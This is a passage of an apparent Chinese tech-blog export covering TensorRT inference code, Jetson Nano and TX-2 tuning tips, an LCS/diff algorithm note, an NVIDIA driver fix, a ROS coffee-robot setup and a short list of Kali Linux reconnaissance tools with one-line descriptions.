<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">params &#x3D; trt.DEFAULT_TRT_CONVERSION_PARAMS</span><br><span class="line">params._replace(precision_mode&#x3D;trt.TrtPrecisionMode.INT8)</span><br><span class="line">converter &#x3D; trt.TrtGraphConverterV2(input_saved_model_dir&#x3D;&#39;.&#x2F;model&#x2F;tf_savedmodel&#39;, conversion_params&#x3D;params)</span><br><span class="line">converter.convert()</span><br><span class="line">converter.save(&#39;.&#x2F;model&#x2F;trt_int8&#39;)</span><br></pre></td></tr></table></figure>

<h3 id="1-2-Inference"><a href="#1-2-Inference" class="headerlink" title="1.2. Inference"></a>1.2. Inference</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if use_trt:</span><br><span class="line">    saved_model_loaded &#x3D; tf.saved_model.load(&#39;.&#x2F;model&#x2F;trt_int8&#39;, tags&#x3D;[trt.tag_constants.SERVING])</span><br><span class="line">    graph_func &#x3D; saved_model_loaded.signatures[trt.signature_constants.DEFAULT_SERVING_SIGNATURE_DEF_KEY]</span><br><span class="line">    self.emotion_classifier &#x3D; frozen_func</span><br><span class="line">else:</span><br><span class="line">    self.emotion_classifier &#x3D; tf.keras.models.load_model(&#39;xxx.hdf5&#39;, compile&#x3D;False)</span><br></pre></td></tr></table></figure>


<h3 id="1-3-v2-Behaviour"><a href="#1-3-v2-Behaviour" class="headerlink" title="1.3. v2 Behaviour"></a>1.3. v2 Behaviour</h3><p>It looks like the current Tensorflow for JP 4.4 was compiled with <code>--config=v1</code> flag, as V2 behaviour seems to be disabled in default.<br>The workaround is:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import tensorflow.compat.v2 as tf</span><br><span class="line">import tensorflow.compat.v2.keras as keras</span><br><span class="line">tf.enable_v2_behavior()</span><br></pre></td></tr></table></figure>

<h2 id="0x02-Others-Pytorch-MxNet-Caffe"><a href="#0x02-Others-Pytorch-MxNet-Caffe" class="headerlink" title="0x02 Others ( Pytorch / MxNet / Caffe )"></a>0x02 Others ( Pytorch / MxNet / Caffe )</h2><h3 id="2-1-Convert-model-to-ONNX"><a href="#2-1-Convert-model-to-ONNX" class="headerlink" title="2.1. Convert model to ONNX"></a>2.1. Convert model to ONNX</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pass</span><br></pre></td></tr></table></figure>

<h3 id="2-2-Build-TensorRT-Engine-from-ONNX-Model"><a href="#2-2-Build-TensorRT-Engine-from-ONNX-Model" class="headerlink" title="2.2. Build TensorRT Engine from ONNX Model"></a>2.2. Build TensorRT Engine from ONNX Model</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def build_engine_onnx(model_file):</span><br><span class="line">    with trt.Builder(TRT_LOGGER) as builder,</span><br><span class="line">        builder.create_network(1 &lt;&lt; int(trt.NetworkDefinitionCreationFlag.EXPLICIT_BATCH)) as network,</span><br><span class="line">            trt.OnnxParser(network, TRT_LOGGER) as parser:</span><br><span class="line">                builder.max_workspace_size &#x3D; common.GiB(1)</span><br><span class="line">                builder.max_batch_size &#x3D; batch_size</span><br><span class="line">                # Load the Onnx model and parse it in order to populate the TensorRT network.</span><br><span class="line">                with open(model_file, &#39;rb&#39;) as model:</span><br><span class="line">                    parser.parse(model.read())</span><br><span class="line">                return builder.build_cuda_engine(network)</span><br><span class="line"></span><br><span class="line">engine &#x3D; build_engine_onnx(&#39;resnet100.onnx&#39;)</span><br><span class="line">engine_file_path &#x3D; &#39;.&#x2F;arcface_trt.engine&#39;</span><br><span class="line">with open(engine_file_path, &quot;wb&quot;) as f:</span><br><span class="line">    f.write(engine.serialize())</span><br></pre></td></tr></table></figure>

<h3 id="2-3-Inference-from-TRT-Engine"><a href="#2-3-Inference-from-TRT-Engine" class="headerlink" title="2.3. Inference from TRT Engine"></a>2.3. Inference from TRT Engine</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def build(engine_file):</span><br><span class="line">    with open(engine_file, &#39;rb&#39;) as f, trt.Runtime(TRT_LOGGER) as runtime:</span><br><span class="line">        engine &#x3D; runtime.deserialize_cuda_engine(f.read())</span><br><span class="line">    inputs, outputs, bindings, stream &#x3D; allocate_buffers(engine)</span><br><span class="line">    context &#x3D; engine.create_execution_context()</span><br><span class="line"></span><br><span class="line">def run(objects_frame):</span><br><span class="line">    allocate_place &#x3D; np.prod(objects_frame.shape)</span><br><span class="line">    inputs[0].host[:allocate_place] &#x3D; objects_frame.flatten(order&#x3D;&#39;C&#39;).astype(np.float32)</span><br><span class="line">    trt_outputs &#x3D; do_inference(</span><br><span class="line">        self.context, bindings&#x3D;self.bindings,</span><br><span class="line">        inputs&#x3D;inputs, outputs&#x3D;outputs, stream&#x3D;stream)</span><br><span class="line"></span><br><span class="line">    return trt_outputs</span><br></pre></td></tr></table></figure>


<h3 id="2-4-pycuda"><a href="#2-4-pycuda" class="headerlink" title="2.4. pycuda"></a>2.4. pycuda</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">try:</span><br><span class="line">    # Sometimes python2 does not understand FileNotFoundError</span><br><span class="line">    FileNotFoundError</span><br><span class="line">except NameError:</span><br><span class="line">    FileNotFoundError &#x3D; IOError</span><br><span class="line"></span><br><span class="line">def GiB(val):</span><br><span class="line">    return val * 1 &lt;&lt; 30   # 1 &lt;&lt; 10 &lt;&lt; 10 &lt;&lt; 10, 1024*1024*1024</span><br><span class="line"></span><br><span class="line"># Simple helper data class that&#39;s a little nicer to use than a 2-tuple.</span><br><span class="line">class HostDeviceMem(object):</span><br><span class="line">    def __init__(self, host_mem, device_mem):</span><br><span class="line">        self.host &#x3D; host_mem</span><br><span class="line">        self.device &#x3D; device_mem</span><br><span class="line"></span><br><span class="line">    def __str__(self):</span><br><span class="line">        return &quot;Host:\n&quot; + str(self.host) + &quot;\nDevice:\n&quot; + str(self.device)</span><br><span class="line"></span><br><span class="line">    def __repr__(self):</span><br><span class="line">        return self.__str__()</span><br><span class="line"></span><br><span class="line"># Allocates all buffers required for an engine, i.e. host&#x2F;device inputs&#x2F;outputs.</span><br><span class="line">def allocate_buffers(engine):</span><br><span class="line">    inputs &#x3D; []</span><br><span class="line">    outputs &#x3D; []</span><br><span class="line">    bindings &#x3D; []</span><br><span class="line">    stream &#x3D; cuda.Stream()</span><br><span class="line">    for binding in engine:</span><br><span class="line">        size &#x3D; trt.volume(engine.get_binding_shape(binding)) * engine.max_batch_size</span><br><span class="line">        dtype &#x3D; trt.nptype(engine.get_binding_dtype(binding))</span><br><span class="line">        # Allocate host and device buffers</span><br><span class="line">        host_mem &#x3D; cuda.pagelocked_empty(size, dtype)      # pagelocked memory (Direct Memory Access，DMA)</span><br><span class="line">        device_mem &#x3D; cuda.mem_alloc(host_mem.nbytes)</span><br><span class="line">        # Append the device buffer to device bindings.</span><br><span class="line">        bindings.append(int(device_mem))</span><br><span class="line">        # Append to the appropriate list.</span><br><span class="line">        if engine.binding_is_input(binding):</span><br><span class="line">            inputs.append(HostDeviceMem(host_mem, device_mem))</span><br><span class="line">        else:</span><br><span class="line">            outputs.append(HostDeviceMem(host_mem, device_mem))</span><br><span class="line">    return inputs, outputs, bindings, stream</span><br><span class="line"></span><br><span class="line"># This function is generalized for multiple inputs&#x2F;outputs.</span><br><span class="line"># inputs and outputs are expected to be lists of HostDeviceMem objects.</span><br><span class="line">def do_inference(context, bindings, inputs, outputs, stream, batch_size&#x3D;1):</span><br><span class="line">    # Transfer input data to the GPU.</span><br><span class="line">    [cuda.memcpy_htod_async(inp.device, inp.host, stream) for inp in inputs]</span><br><span class="line">    # Run inference.</span><br><span class="line">    context.execute_async(batch_size&#x3D;batch_size, bindings&#x3D;bindings, stream_handle&#x3D;stream.handle)</span><br><span class="line">    # Transfer predictions back from the GPU.</span><br><span class="line">    [cuda.memcpy_dtoh_async(out.host, out.device, stream) for out in outputs]</span><br><span class="line">    # Synchronize the stream</span><br><span class="line">    stream.synchronize()</span><br><span class="line">    # Return only the host outputs.</span><br><span class="line">    return [out.host for out in outputs]</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>深度学习</category>
      </categories>
      <tags>
        <tag>边缘计算</tag>
      </tags>
  </entry>
  <entry>
    <title>「Jetson Nano」 Reduce Memory Usage</title>
    <url>/post/jetson-nano-reduce-memory-usage/</url>
    <content><![CDATA[<blockquote>
<p>Nano 的4G内存太小了（最近还出来一个2G版nano &gt;_&lt;），模型跑不动的患者可以通过以下几个步骤减少内存消耗。</p>
</blockquote>
<p><strong>1. 关闭用户图形界面</strong><br>sudo systemctl set-default multi-user.target<br>sudo reboot</p>
<p>开启用户图形界面<br>sudo systemctl set-default graphical.target<br>sudo reboot</p>
<p><strong>2. 切换图形界面</strong><br>默认图形界面为Unity，Ubuntu 18 系统自带Gnome3，可切换到 lxde 以节约内存。</p>
<ul>
<li>GNOME3 :1047M</li>
<li>Unity: 517M</li>
<li>xfce: 247M</li>
<li>lxde: 214M</li>
</ul>
<p><strong>3. 关闭 dockerd 节约 49M</strong></p>
]]></content>
      <categories>
        <category>工作笔记</category>
      </categories>
      <tags>
        <tag>Jetson</tag>
      </tags>
  </entry>
  <entry>
    <title>Jetson TX-2 入门 -- 全部你应该知道的</title>
    <url>/post/jetson-tx-2-all-you-know/</url>
    <content><![CDATA[<blockquote>
<p>首先庆祝一下我用TX-1做实验写的《<a href="http://crad.ict.ac.cn/CN/Y2017/V54/I6/1316">GPU加速与L-ORB特征提取的全景视频实时拼接</a>》发表啦^_^<br>导师表示很开心，又给我买了两台TX-2</p>
</blockquote>
<p><code>TX-2比TX-1除了性能的升级，其它部分没有太大变化，接下来要写的小技巧对于TX-1/2都适用。使用期间发现的问题都会持续更新到这篇博客，目前发现的问题有：</code></p>
<ul>
<li>OpenCV4Tegra 不支持 -lopencv_nonfree</li>
<li>OpenCV4Tegra 在TX-2中不支持 GPU 模块</li>
<li>如何开启被屏蔽的2块CPU并设置为最大频率</li>
<li>开启Nvidia TX-1/2 的VNC</li>
</ul>
<span id="more"></span>

<h2 id="0x01-OpenCV4Tegra-不支持-lopencv-nonfree"><a href="#0x01-OpenCV4Tegra-不支持-lopencv-nonfree" class="headerlink" title="0x01 OpenCV4Tegra 不支持 -lopencv_nonfree"></a>0x01 OpenCV4Tegra 不支持 -lopencv_nonfree</h2><p>Jetpack 自带的 Opencv 不支持 nonfree 库，因此就不能使用SIFT/SURF这种专利算法。要使用nonfree库有两种解决方案<a href="http://elinux.org/Jetson/Installing_OpenCV#Prebuilt_OpenCV_library_versus_Building_the_OpenCV_library_from_source">[参考]</a>：</p>
<blockquote>
<p>Note about SIFT/SURF in the nonfree module: OpenCV4Tegra doesn’t include the opencv_nonfree package (containing SIFT &amp; SURF feature detectors) since those algorithms are patented by other companies and therefore anyone using opencv_nonfree is at risk of liability.</p>
</blockquote>
<blockquote>
<p>If you need something from the nonfree module, you have 2 options:</p>
</blockquote>
<blockquote>
<ol>
<li>Analyze the public OpenCV source code then copy/paste the parts of the nonfree module that you want (eg: SURF feature detector) from OpenCV into your own project. You will have the CPU optimizations of OpenCV4Tegra for most of your code and will have the GPU module and will have the non-optimized patented code that you need from the nonfree package such as SURF. So this option gives full performance (for everything except the nonfree code) but is tedious.</li>
<li>Ignore OpenCV4Tegra, and instead, download &amp; build public OpenCV (by following the instructions below for natively compiling the OpenCV library from source). You will still have the GPU module but not any CPU optimizations, but you won’t need to spend time ripping out parts of the OpenCV non-free module code. So this option is easiest but produces slower code if you are running most of your code on CPU.</li>
</ol>
</blockquote>
<p>并且 libopencv4tegra 是2.4版的opencv，要使用3.0+版本的还是得自己编译opencv才行。(缺点是自己编译的opencv没有CPU优化）<br>自行编译Opencv的方法在<a href="http://docs.opencv.org/3.2.0/d6/d15/tutorial_building_tegra_cuda.html">这里</a>，教程上采用的是opencv 3.1.0,还打了补丁。我直接用3.2.0版本编译安装的，至今还没发现问题。</p>
<p><strong>make的时候记得加参数-j6开启6个线程</strong>否则会很慢</p>
<h2 id="0x02-OpenCV4Tegra-在TX-2中不支持-GPU-模块"><a href="#0x02-OpenCV4Tegra-在TX-2中不支持-GPU-模块" class="headerlink" title="0x02 OpenCV4Tegra 在TX-2中不支持 GPU 模块"></a>0x02 OpenCV4Tegra 在TX-2中不支持 GPU 模块</h2><blockquote>
<p>Currently, libopencv_gpu.so can’t be used on TX2 since wrong compute architecture.</p>
<p>We are really sorry about this issue. For temporally solution, please build opencv from source.<br>Opencv2.4.13:<br><a href="http://docs.opencv.org/master/d6/d15/tutorial_building_tegra_cuda.html#tutorial_building_tegra_cuda_opencv_24X">http://docs.opencv.org/master/d6/d15/tutorial_building_tegra_cuda.html#tutorial_building_tegra_cuda_opencv_24X</a><br>Opencv3.x:<br><a href="https://devtalk.nvidia.com/default/topic/983098/jetson-tx1/opencv-3-1-with-usb-camera-support/">https://devtalk.nvidia.com/default/topic/983098/jetson-tx1/opencv-3-1-with-usb-camera-support/</a></p>
<p>We are working on this issue and will update information to you soon.<br>Thanks and sorry for all the inconvenience.</p>
</blockquote>
<p><a href="https://devtalk.nvidia.com/default/topic/1000106/jetson-tx2/opencv-convertto-failure/post/5114306/#5114306">参考</a></p>
<h2 id="0x03-开启被屏蔽的2块CPU并设置为最大频率"><a href="#0x03-开启被屏蔽的2块CPU并设置为最大频率" class="headerlink" title="0x03 开启被屏蔽的2块CPU并设置为最大频率"></a>0x03 开启被屏蔽的2块CPU并设置为最大频率</h2><p>使用位于home目录的<code>tegrastats</code>命令可以查看TX-2的使用情况</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ~&#x2F;tegrastats</span><br><span class="line">RAM 1282&#x2F;7854MB (lfb 1x256kB) cpu [21%@2035,off,off,15%@2035,17%@2035,15%@2035]</span><br></pre></td></tr></table></figure>

<p>那么问题来了，为什么有两块cpu被关闭（off）了。解决方案在这<a href="https://devtalk.nvidia.com/default/topic/1000345/two-cores-disabled-/">Two cores disabled</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo su</span><br><span class="line">$ echo 1 &gt; &#x2F;sys&#x2F;devices&#x2F;system&#x2F;cpu&#x2F;cpu1&#x2F;online</span><br><span class="line">$ echo 1 &gt; &#x2F;sys&#x2F;devices&#x2F;system&#x2F;cpu&#x2F;cpu2&#x2F;online</span><br></pre></td></tr></table></figure>

<p>此时两块CPU开启</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nvidia@tegra-ubuntu:~$ ~&#x2F;tegrastats</span><br><span class="line">RAM 973&#x2F;7854MB (lfb 1545x4MB) cpu [0%@2035,0%@345,0%@345,0%@2035,0%@2035,0%@2035]</span><br></pre></td></tr></table></figure>

<p>注意到两块CPU的频率为345，下面执行<code>~/jetson_clocks.sh</code>开启最大频率</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ~&#x2F;tegrastats</span><br><span class="line">RAM 979&#x2F;7854MB (lfb 1545x4MB) cpu [0%@2035,0%@2419,0%@2419,0%@2035,0%@2035,0%@2035]</span><br></pre></td></tr></table></figure>

<p>你会注意到不但cpu的频率提升到了2419，你手头TX-2的小风扇也跟着华丽的转起来了。</p>
<h2 id="0x04-开启VNC"><a href="#0x04-开启VNC" class="headerlink" title="0x04 开启VNC"></a>0x04 开启VNC</h2><p>默认的 ubuntu 点几下鼠标就可以开启 VNC 请看下面的讨论<br><a href="https://devtalk.nvidia.com/default/topic/984355/set-up-vnc-on-the-tx1/">Set up VNC on the TX1</a></p>
]]></content>
      <categories>
        <category>硬件</category>
      </categories>
      <tags>
        <tag>GPU</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux 内网渗透学习笔记</title>
    <url>/post/kali-note/</url>
    <content><![CDATA[<blockquote>
<p>前段时间参加一了个信息安全比赛，赛前突击整理了一下 Kali Linux 的工具用法，记录如下。</p>
</blockquote>
<span id="more"></span>

<h2 id="0x00-Information-Gathering"><a href="#0x00-Information-Gathering" class="headerlink" title="0x00 Information Gathering"></a>0x00 Information Gathering</h2><p>信息收集分为被动收集和主动收集。被动收集对主机没有交互，为静默式信息收集，如下：</p>
<h3 id="DNS-Analysis"><a href="#DNS-Analysis" class="headerlink" title="DNS Analysis"></a>DNS Analysis</h3><p>通过对DNS的Google查询/暴力破解/Whois查询等，我们可以获得整个域的网站服务器</p>
<ul>
<li>dnsenum</li>
<li>dnsmap</li>
</ul>
<h3 id="Route-Analysis"><a href="#Route-Analysis" class="headerlink" title="Route Analysis"></a>Route Analysis</h3><ul>
<li>traceroute 通过UDP方式，不容易穿透防火墙，基本不采用</li>
<li>tcptraceroute 采用TCP包，有良好的穿透防火墙性能</li>
<li>tctrace 原理与tcptraceroute相同</li>
</ul>
<h3 id="Maltegoce"><a href="#Maltegoce" class="headerlink" title="Maltegoce"></a>Maltegoce</h3><p><strong>GUI界面的，啥都能搜，全自动搜索。</strong></p>
<hr>
<p>下面基本是主动惨测工具</p>
<h3 id="Live-Host-Identification"><a href="#Live-Host-Identification" class="headerlink" title="Live Host Identification"></a>Live Host Identification</h3><ul>
<li>ping: Ping 不通很正常</li>
<li>arping: 优点：主机对 ARP request 肯定有响应。缺点：主机必须直连</li>
<li>fping: 跟ping一个原理，只是比较快</li>
<li><strong>hping3</strong>: 功能比较强大，可以自定义产生包</li>
<li>nping </li>
<li>p0f: 被动探测操作系统</li>
<li>Xprobe2: 主动惨测操作系统</li>
</ul>
<h3 id="SNMP-Analysis"><a href="#SNMP-Analysis" class="headerlink" title="SNMP Analysis"></a>SNMP Analysis</h3><ul>
<li>onesixtyone: 找出设备的SNMP Community字串，需要挂字典，速度非常快。</li>
</ul>
<h3 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h3><ul>
<li><strong>nmap</strong>: 正经扫描器，GUI 为 Zenmap</li>
<li>amap: 检测端口运行的具体应用</li>
<li>ike-scan: 探测VPN</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://xiao106347.blog.163.com/blog/#m=0&t=3&c=kali-linux">Linux 折腾笔记 - Kali linux</a></p>
]]></content>
      <categories>
        <category>信息安全</category>
      </categories>
  </entry>
  <entry>
    <title>最长公共子序列（LCS）到git diff</title>
    <url>/post/lcs/</url>
    <content><![CDATA[<blockquote>
<p>当宿命从你门前走过的时候，芸芸众生总是显得那么渺小</p>
</blockquote>
<h2 id="0x00-LCS"><a href="#0x00-LCS" class="headerlink" title="0x00 LCS"></a>0x00 LCS</h2><p><code>最长公共子序列</code>跟<code>最长不降子序列</code>以及<code>最长公共字串</code>都不是一回事。这种用搜索时间复杂度太高的问题一般都会选择用DP来解决。状态转移方程为：</p>
<p>$$c[i,j] = \begin{cases}<br>0, &amp; i=0 \text{ or }  j=0<br>\\ c[i-1,j-1]+1, &amp; x_i =y_j<br>\\ max(c[i-1,j],c[i,j-1]), &amp;x_i \neq y_i<br> \end{cases}$$</p>
<span id="more"></span>

<p>然后我们顺手就可以写出伪代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">memset(c,0)</span><br><span class="line">for i&#x3D;1-&gt;len(x)</span><br><span class="line">  for j&#x3D;1-&gt;len(y)</span><br><span class="line">    if x[i]&#x3D;&#x3D;y[j]</span><br><span class="line">      c[i,j]&#x3D;c[i-1,j-1]+1</span><br><span class="line">    else</span><br><span class="line">      c[i,j]&#x3D;max(c[i-1,j],c[i,j-1])</span><br></pre></td></tr></table></figure>

<p>那么问题来了，开个二维数组进行dp实在是太浪费空间了。仔细观察上面的伪代码，i作为最外层循环在循环内部只调用了i和i-1两个数值，所以事实上只需要<code>当前行(i)</code>和<code>前一行(i-1)</code>。<a href="http://blog.csdn.net/liar771/article/details/53870165">这篇文章</a>有一个很优美的解决方案，定义一个<code>2×len(x)</code>的数组，和<code>pre</code> <code>now</code>两个变量作为指针，每一次循环分别交换这两个变量的值。伪码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">memset(c,0)</span><br><span class="line">now&#x3D;1,pre&#x3D;0</span><br><span class="line">for i&#x3D;1-&gt;len(x)</span><br><span class="line">  for j&#x3D;1-&gt;len(y)</span><br><span class="line">    if x[i]&#x3D;&#x3D;y[j]</span><br><span class="line">      c[now,j]&#x3D;c[pre,j-1]+1</span><br><span class="line">    else</span><br><span class="line">      c[now,j]&#x3D;max(c[pre,j],c[now,j-1])</span><br><span class="line">  swap(now,pre)</span><br></pre></td></tr></table></figure>
<p>通过交换指针的值来实现交换两行数组确实实现了函数的优美。那么还有没有更优的方案了呢。</p>
<p>经过分析，对于pre行，其实也只是使用了第j和j-1列。类系<a href="http://blog.csdn.net/tommengdle/article/details/6946309">这篇文章</a>我们定义两个变量<code>leftabove, above</code>代替<code>pre行</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">memset(c,0)</span><br><span class="line">for i&#x3D;1-&gt;len(x)</span><br><span class="line">  for j&#x3D;1-&gt;len(y)</span><br><span class="line">    if x[i]&#x3D;&#x3D;y[j]</span><br><span class="line">      c[j]&#x3D;leftabove+1</span><br><span class="line">    else</span><br><span class="line">      c[j]&#x3D;max(above,c[j-1])</span><br><span class="line">    leftabove&#x3D;above</span><br><span class="line">    above&#x3D;c[j+1] </span><br></pre></td></tr></table></figure>
<p>这样，空间便缩减为了<code>len(x)+2</code></p>
<h2 id="0x01-diff"><a href="#0x01-diff" class="headerlink" title="0x01 diff"></a>0x01 diff</h2><p>现在广泛采用的 diff 算法，也是类似上面所说的 LCS 算法。但为什么对两个超大的文件进行diff依然速度飞快呢？现在的diff基本上采用的是 Eugene Myers 的论文 <a href="http://www.xmailserver.org/diff2.pdf">An O(ND) Difference Algorithm and its Variations</a> 上面写的方法的变种</p>
<p><code>现在实在看不懂，留个坑回头慢慢写</code></p>
<blockquote>
<p>为了生存你展翅高飞<br>但是你要学会随波逐流<br>才能在汹涌的浪尖上从容不迫<br>否则就是铤而走险，自掘坟墓</p>
</blockquote>
]]></content>
      <categories>
        <category>工作笔记</category>
      </categories>
  </entry>
  <entry>
    <title>linux kernel bug 导致无法载入 nvidia 驱动</title>
    <url>/post/littlebug/</url>
    <content><![CDATA[<p>执行 <code>nvidia-smi</code> 显示：  NVIDIA-SMI has failed because it couldn’t communicate with the NVIDIA driver. Make sure that the latest NVIDIA driver is installed and running.</p>
<span id="more"></span>

<p>执行 <code>sudo modprobe nvidia</code> 显示 modprobe: ERROR: could not insert ‘nvidia_384’: Exec format error</p>
<p>执行 <code>dmesg</code> 最后几行显示一坨红色字（不记得了）</p>
<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>这是<code>linux kernel 4.4.0-116-generic</code> 的一个小bug，降级到<code>linux kernel 4.4.0-112-generic</code>，再重装一下driver（不用重装cuda）问题就解决了</p>
]]></content>
      <categories>
        <category>工作笔记</category>
      </categories>
  </entry>
  <entry>
    <title>新工作：制作一个送咖啡机器人——第一周</title>
    <url>/post/making-a-coffeebot-1/</url>
    <content><![CDATA[<blockquote>
<p>来北京一个月，一直蜗居在一个小屋里，没有钱花+前途迷茫的感觉真是浑身难受。<br>我现在的任务是接手之前几个客座生的项目，用Turtlebot做一个送咖啡机器人。第一周的时间用来搭建一个完整的demo</p>
</blockquote>
<p><img src="http://qiniu.s1nh.org/Blog_cartographer_main.gif" title="别紧张，这个是 Cartographer 官方的Gif图"></p>
<span id="more"></span>

<h2 id="0x01-ROS系统"><a href="#0x01-ROS系统" class="headerlink" title="0x01  ROS系统"></a>0x01  ROS系统</h2><p>不用买什么书，建议直接在官方的翻译很烂的<a href="http://wiki.ros.org/cn/ROS/Tutorials">Tutorials</a>中学习。需要掌握的基本知识有：</p>
<ul>
<li><strong>安装ROS</strong></li>
<li><strong>配置环境</strong></li>
<li><strong>文件系统工具</strong> <code>rospack</code> <code>roscd</code> `</li>
<li><strong>catkin管理工具包</strong> （因为我经常使用 <code>catkin_make_isolate</code> 所以我在 ~/.bash_alias 中添加了一行<code>alias make_robot=&#39;cd ~/project/catkin_ws ; catkin_make_isolated --install --use-ninja ; cd -&#39;</code>）</li>
<li><strong>节点(node)</strong> <code>roscore</code> <code>rosnode list/info/ping</code> <code>rosrun</code></li>
<li><strong><a href="http://wiki.ros.org/cn/ROS/Tutorials/UnderstandingTopics">话题(Topic)</a></strong> 键盘/代码控制小乌龟到处跑， <code>rqt_graph</code> <code>rqt_plot</code> <code>rostopic echo</code> <code>rostopic list -v</code> <code>rostopic type</code> <code>rosmsg show</code> <code>rostopic pub [topic] [msg_type] [args]</code></li>
<li><strong>服务/参数</strong> <code>rosservice list/type/call</code> <code>rossrv</code> <code>rosparam list/get/set/dump/load</code></li>
<li><strong>调试/运行</strong> <code>rqt_console</code> <code>rqt_logger_level</code> <code>roslaunch</code></li>
</ul>
<h2 id="0x02-SLAM-Cartographer-ROS-for-TurtleBots"><a href="#0x02-SLAM-Cartographer-ROS-for-TurtleBots" class="headerlink" title="0x02 SLAM: Cartographer ROS for TurtleBots"></a>0x02 SLAM: Cartographer ROS for TurtleBots</h2><p>我按照<a href="https://google-cartographer-ros-for-turtlebots.readthedocs.io/en/latest/">官方教程</a>没有出错，可能因为我这边原生ipv6翻墙。如果在<code>catkin_make_isolated</code>这一步出问题了，可以看<a href="http://blog.csdn.net/ywj447/article/details/52922487">这篇</a>。</p>
<p>装完以后记得运行一下<a href="https://google-cartographer-ros-for-turtlebots.readthedocs.io/en/latest/#running-the-demo">官方教程</a>的demo。</p>
<p>前面说的<code>Cartographer ROS for TurtleBots</code>的文档只有安装和使用demo的教程，完整的文档在<a href="https://google-cartographer-ros.readthedocs.io/en/latest/index.html">Cartographer ROS</a>里。<strong>Google问题之前先看完文档</strong></p>
<h3 id="——Cartographer-中出现的问题——"><a href="#——Cartographer-中出现的问题——" class="headerlink" title="——Cartographer 中出现的问题——"></a>——Cartographer 中出现的问题——</h3><p><strong>(1) 清理旧的编译文件</strong></p>
<p>在我的笔记本上测试没问题后，安装到机器人的过程中却出了一个BUG。<br><code>error: ‘cartographer_ros_msgs::SubmapQuery::Request’ has no member named ‘submap_index’</code><br>在 github 中有一篇<a href="https://github.com/googlecartographer/cartographer/issues/211">Issue</a>提到了这个问题， 原因是师兄留给我的电脑中有老版本的cartographer_ros没有定义<code>submap_index</code>，在我重新安装的时候除了冲突。<br>解决方案是在 catkin_make_isolated 之前 clean 一下目录（我不会clean所以把除了src之外的目录都删掉了-_-）</p>
<p><strong>(2) 在ubuntu 16.04下，执行到 <code>rosdep install</code> 的时候报错</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ rosdep install --from-paths src --ignore-src --rosdistro&#x3D;$&#123;ROS_DISTRO&#125; -y</span><br><span class="line">ERROR: the following packages&#x2F;stacks could not have their rosdep keys resolved</span><br><span class="line">to system dependencies:</span><br><span class="line">ceres-solver: No definition of [eigen] for OS version []</span><br><span class="line">cartographer: No definition of [eigen] for OS version []</span><br></pre></td></tr></table></figure>

<p>我把这行命令后面加上 <code>--os=ubuntu:xenial</code> 问题解决</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ rosdep install --from-paths src --ignore-src --rosdistro&#x3D;$&#123;ROS_DISTRO&#125; -y --os&#x3D;ubuntu:xenial</span><br><span class="line">#All required rosdeps installed successfully</span><br></pre></td></tr></table></figure>

<p>我提交了<a href="https://github.com/googlecartographer/cartographer_ros/issues/485">一个issue</a>，因为是rosdep的原因，被关闭了。</p>
<h2 id="0x03-Lidar-rplidar"><a href="#0x03-Lidar-rplidar" class="headerlink" title="0x03 Lidar: rplidar"></a>0x03 Lidar: rplidar</h2><p>直接按照<a href="https://github.com/robopeak/rplidar_ros">官方教程</a>装好，测试可用</p>
<p>Robot <code>roslaunch rplidar_ros rplidar_robot.launch</code><br>notebook <code>roslaunch cartographer_ros demo_lidar.launch</code></p>
<h2 id="0x04-底盘-Turltlebot-kobuki"><a href="#0x04-底盘-Turltlebot-kobuki" class="headerlink" title="0x04 底盘 Turltlebot-kobuki"></a>0x04 底盘 Turltlebot-kobuki</h2><p>基本的安装、使用方法这都有《<a href="http://www.ncnynl.com/category/ros-kobuki/">Kobuki入门教程</a>》</p>
<p><code>roslaunch kobuki_keyop safe_keyop.launch</code></p>
<h2 id="0x05-kobuki-rplidar-Cartographer-实时构建地图"><a href="#0x05-kobuki-rplidar-Cartographer-实时构建地图" class="headerlink" title="0x05 kobuki + rplidar + Cartographer 实时构建地图"></a>0x05 kobuki + rplidar + Cartographer 实时构建地图</h2><p>前面三个工具包调试成功以后，我们就可以用键盘控制kobuki移动，用rplidar采集数据通过Cartographer 实时构建地图啦。</p>
<p>《<a href="http://www.ncnynl.com/archives/201702/1371.html">ROS与SLAM入门教程-cartographer在Turltlebot的应用3-构建地图</a>》可以参考（里面好像有点小错误）。需要注意的是，新增加的<code>turtlebot_lidar.launch</code>和<code>turtlebot_lidar_2d.launch</code>是根据原有的<code>turtlebot.launch</code>和<code>turtlebot_urg_lidar_2d.launch</code>修改而来的，同学们可以用<code>diff</code>命令查看他们的区别。</p>
